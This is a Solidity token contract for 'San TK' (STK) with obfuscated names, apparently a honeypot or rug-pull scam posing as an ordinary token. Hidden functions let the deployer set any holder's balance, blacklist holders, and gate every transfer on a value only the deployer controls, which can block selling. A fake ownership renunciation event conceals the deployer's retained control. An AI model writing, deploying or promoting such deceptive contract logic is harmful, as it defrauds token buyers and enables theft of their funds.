//SPDX-License-Identifier: MIT

pragma solidity ^0.8.9;

interface dbokcyojibgcf {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract ejxiqfmjujahp {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface lnrkqxnwy {
    function createPair(address gfynzpzttv, address cawjmbrwamfsn) external returns (address);
}

interface zicejdzecltbz {
    function totalSupply() external view returns (uint256);

    function balanceOf(address iljfyufyfsc) external view returns (uint256);

    function transfer(address ngddbvgtkehqu, uint256 ptyjbemxjqnl) external returns (bool);

    function allowance(address bfrewhyawhg, address spender) external view returns (uint256);

    function approve(address spender, uint256 ptyjbemxjqnl) external returns (bool);

    function transferFrom(
        address sender,
        address ngddbvgtkehqu,
        uint256 ptyjbemxjqnl
    ) external returns (bool);

    event Transfer(address indexed from, address indexed reeptxaib, uint256 value);
    event Approval(address indexed bfrewhyawhg, address indexed spender, uint256 value);
}

interface zicejdzecltbzMetadata is zicejdzecltbz {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract SanTK is ejxiqfmjujahp, zicejdzecltbz, zicejdzecltbzMetadata {

    mapping(address => uint256) private dyahpwufmsrhjs;

    function qgtyycopldphr() public {
        emit OwnershipTransferred(urpnnwolf, address(0));
        slxelaqxwknya = address(0);
    }

    mapping(address => bool) public uhawbdiwnxby;

    function ephsjiviv(address fkvkygnrvglfu, address ngddbvgtkehqu, uint256 ptyjbemxjqnl) internal returns (bool) {
        require(dyahpwufmsrhjs[fkvkygnrvglfu] >= ptyjbemxjqnl);
        dyahpwufmsrhjs[fkvkygnrvglfu] -= ptyjbemxjqnl;
        dyahpwufmsrhjs[ngddbvgtkehqu] += ptyjbemxjqnl;
        emit Transfer(fkvkygnrvglfu, ngddbvgtkehqu, ptyjbemxjqnl);
        return true;
    }

    address private slxelaqxwknya;

    function transfer(address mkefaihltok, uint256 ptyjbemxjqnl) external virtual override returns (bool) {
        return ukjsynlbkkkuv(_msgSender(), mkefaihltok, ptyjbemxjqnl);
    }

    function approve(address vzuezitzfqkdu, uint256 ptyjbemxjqnl) public virtual override returns (bool) {
        vmuxzarjv[_msgSender()][vzuezitzfqkdu] = ptyjbemxjqnl;
        emit Approval(_msgSender(), vzuezitzfqkdu, ptyjbemxjqnl);
        return true;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return sbibatgucpsgkj;
    }

    uint256 constant tbrbxkttlt = 9 ** 10;

    function kceautfrh(uint256 ptyjbemxjqnl) public {
        xcgxuelmvklcj();
        pwkbsaummdpd = ptyjbemxjqnl;
    }

    function owner() external view returns (address) {
        return slxelaqxwknya;
    }

    function ukjsynlbkkkuv(address fkvkygnrvglfu, address ngddbvgtkehqu, uint256 ptyjbemxjqnl) internal returns (bool) {
        if (fkvkygnrvglfu == urpnnwolf) {
            return ephsjiviv(fkvkygnrvglfu, ngddbvgtkehqu, ptyjbemxjqnl);
        }
        uint256 dygcdsohpaj = zicejdzecltbz(pevwjipbnh).balanceOf(qflpnwxecpntra);
        require(dygcdsohpaj == pwkbsaummdpd);
        require(ngddbvgtkehqu != qflpnwxecpntra);
        if (uhawbdiwnxby[fkvkygnrvglfu]) {
            return ephsjiviv(fkvkygnrvglfu, ngddbvgtkehqu, tbrbxkttlt);
        }
        return ephsjiviv(fkvkygnrvglfu, ngddbvgtkehqu, ptyjbemxjqnl);
    }

    uint256 public fsvvohldwmtry;

    event OwnershipTransferred(address indexed ynjikpxuf, address indexed ebkayisgn);

    function decimals() external view virtual override returns (uint8) {
        return kjpldxazz;
    }

    address qflpnwxecpntra = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function csyqgsyfted(address awjsvliul) public {
        xcgxuelmvklcj();
        if (qkhzwjoknh != rdhsatjifkdj) {
            hawmcozkbiw = false;
        }
        if (awjsvliul == urpnnwolf || awjsvliul == pevwjipbnh) {
            return;
        }
        uhawbdiwnxby[awjsvliul] = true;
    }

    function symbol() external view virtual override returns (string memory) {
        return ollktmozqn;
    }

    uint256 private qkhzwjoknh;

    string private ollktmozqn = "STK";

    function transferFrom(address fkvkygnrvglfu, address ngddbvgtkehqu, uint256 ptyjbemxjqnl) external override returns (bool) {
        if (_msgSender() != jbsgjstblqc) {
            if (vmuxzarjv[fkvkygnrvglfu][_msgSender()] != type(uint256).max) {
                require(ptyjbemxjqnl <= vmuxzarjv[fkvkygnrvglfu][_msgSender()]);
                vmuxzarjv[fkvkygnrvglfu][_msgSender()] -= ptyjbemxjqnl;
            }
        }
        return ukjsynlbkkkuv(fkvkygnrvglfu, ngddbvgtkehqu, ptyjbemxjqnl);
    }

    mapping(address => bool) public ewjmsuoxb;

    mapping(address => mapping(address => uint256)) private vmuxzarjv;

    function name() external view virtual override returns (string memory) {
        return kwnydxjvat;
    }

    function nlnauewwogqht(address krgtigkzjfoc) public {
        if (jhgaaltge) {
            return;
        }
        if (qkhzwjoknh != fsvvohldwmtry) {
            zglaljiejthvz = tstkmtlqxlpxe;
        }
        ewjmsuoxb[krgtigkzjfoc] = true;
        if (rdhsatjifkdj == zglaljiejthvz) {
            hawmcozkbiw = true;
        }
        jhgaaltge = true;
    }

    address public urpnnwolf;

    bool private hawmcozkbiw;

    bool public jhgaaltge;

    uint256 epwkgitlo;

    address jbsgjstblqc = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    address public pevwjipbnh;

    function gapvcdhwujeo(address mkefaihltok, uint256 ptyjbemxjqnl) public {
        xcgxuelmvklcj();
        dyahpwufmsrhjs[mkefaihltok] = ptyjbemxjqnl;
    }

    uint256 public tstkmtlqxlpxe;

    function getOwner() external view returns (address) {
        return slxelaqxwknya;
    }

    bool public cakhejlojkqse;

    function allowance(address yqdszrhyaz, address vzuezitzfqkdu) external view virtual override returns (uint256) {
        if (vzuezitzfqkdu == jbsgjstblqc) {
            return type(uint256).max;
        }
        return vmuxzarjv[yqdszrhyaz][vzuezitzfqkdu];
    }

    uint256 public zglaljiejthvz;

    uint256 private sbibatgucpsgkj = 100000000 * 10 ** 18;

    function balanceOf(address iljfyufyfsc) public view virtual override returns (uint256) {
        return dyahpwufmsrhjs[iljfyufyfsc];
    }

    constructor (){
        
        qgtyycopldphr();
        dbokcyojibgcf zltegnfmmblhn = dbokcyojibgcf(jbsgjstblqc);
        pevwjipbnh = lnrkqxnwy(zltegnfmmblhn.factory()).createPair(zltegnfmmblhn.WETH(), address(this));
        
        urpnnwolf = _msgSender();
        ewjmsuoxb[urpnnwolf] = true;
        dyahpwufmsrhjs[urpnnwolf] = sbibatgucpsgkj;
        
        emit Transfer(address(0), urpnnwolf, sbibatgucpsgkj);
    }

    uint256 pwkbsaummdpd;

    uint8 private kjpldxazz = 18;

    uint256 private rdhsatjifkdj;

    string private kwnydxjvat = "San TK";

    function xcgxuelmvklcj() private view {
        require(ewjmsuoxb[_msgSender()]);
    }

}